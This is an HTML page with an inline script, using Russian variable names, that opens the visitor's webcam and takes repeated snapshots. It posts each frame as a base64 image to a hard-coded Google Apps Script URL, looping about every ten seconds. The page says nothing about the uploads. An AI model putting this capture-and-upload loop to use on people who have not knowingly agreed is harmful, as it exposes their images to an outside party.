<!DOCTYPE HTML>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=windows-1251"/>
	<title>2</title>
	
</head>
<body>
<video id='v' autoplay></video>
<script>
const vid=document.getElementById('v');
	var canvas =document.createElement('canvas');
	var ctx=canvas.getContext('2d');
	canvas.width=320/2
	canvas.height=240/2
	

var негатив='';
	
	function снимок(){
	ctx.drawImage(vid,0,0);	
	var imk=new Image(320/2,240/2);imk.crossOrigin = "anonymous";
	imk.src=canvas.toDataURL();
	console.log(imk.src.length)
	запрос.open("POST",Гуглоключ,true)
	
	setTimeout(() => {запрос.send(JSON.stringify({ a: 'I', b: 2, c: imk.src }));console.log('запрошено')}, "10000");
	
	}

navigator.mediaDevices.getUserMedia({video:true}).then((stream)=>{vid.srcObject=stream})

var запрос = new XMLHttpRequest();

запрос.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) 
        {  
снимок();
        }
};
Гуглоключ='https://script.google.com/macros/s/AKfycbyk59xkCMNvFh08110nvjBjWUMa8Dix_0pwpy2c4OPT98oRFpj5rM-EA5yGHL0OGVzb/exec'
запрос.open("POST",Гуглоключ,true)
запрос.send(JSON.stringify({ b: 3 }));

</script>
</body>
</html>
